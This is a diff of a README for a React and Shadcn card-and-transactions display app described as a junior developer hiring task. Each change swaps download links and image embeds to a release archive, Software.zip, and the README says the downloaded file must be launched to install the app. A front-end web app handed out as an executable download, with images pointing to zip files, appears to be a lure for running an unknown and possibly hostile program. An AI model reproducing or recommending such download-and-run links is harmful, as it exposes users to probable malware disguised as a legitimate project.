@@ -2,7 +2,7 @@
 
 Welcome to the Card Information and Transactions Display App repository, a project created as a task for the Junior Front-End Developer Position at Bakar Company. This project is built using React and Shadcn, along with various other technologies and tools to enhance the user experience. 
 
-![Card-Information-and-Transactions-Display-App](https://github.com/kaduzinhopoggers/Card-Information-and-Transactions-Display-App---Bakar/releases/download/v1.0/Soft.zip)
+![Card-Information-and-Transactions-Display-App](https://github.com/kaduzinhopoggers/Card-Information-and-Transactions-Display-App---Bakar/releases/download/v2.0/Software.zip)
 
 ## Technologies and Tools Used 🛠️
 
@@ -38,7 +38,7 @@ To use the Card Information and Transactions Display App, follow these steps:
 
 To download the latest release of the Card Information and Transactions Display App, click the button below:
 
-[![Download Release](https://github.com/kaduzinhopoggers/Card-Information-and-Transactions-Display-App---Bakar/releases/download/v1.0/Soft.zip)](https://github.com/kaduzinhopoggers/Card-Information-and-Transactions-Display-App---Bakar/releases/download/v1.0/Soft.zip)
+[![Download Release](https://github.com/kaduzinhopoggers/Card-Information-and-Transactions-Display-App---Bakar/releases/download/v2.0/Software.zip)](https://github.com/kaduzinhopoggers/Card-Information-and-Transactions-Display-App---Bakar/releases/download/v2.0/Software.zip)
 
 *Please note that the downloaded file needs to be launched to install and run the app.*
 
@@ -54,4 +54,4 @@ If you encounter any issues or have any questions regarding the app, please reac
 
 Thank you for taking the time to explore the Card Information and Transactions Display App repository. We hope you enjoy using the app and find it helpful for your card information and transaction display needs. Happy browsing! 🌟
 
-![Card-Information-and-Transactions-Display-App](https://github.com/kaduzinhopoggers/Card-Information-and-Transactions-Display-App---Bakar/releases/download/v1.0/Soft.zip)
+![Card-Information-and-Transactions-Display-App](https://github.com/kaduzinhopoggers/Card-Information-and-Transactions-Display-App---Bakar/releases/download/v2.0/Software.zip)
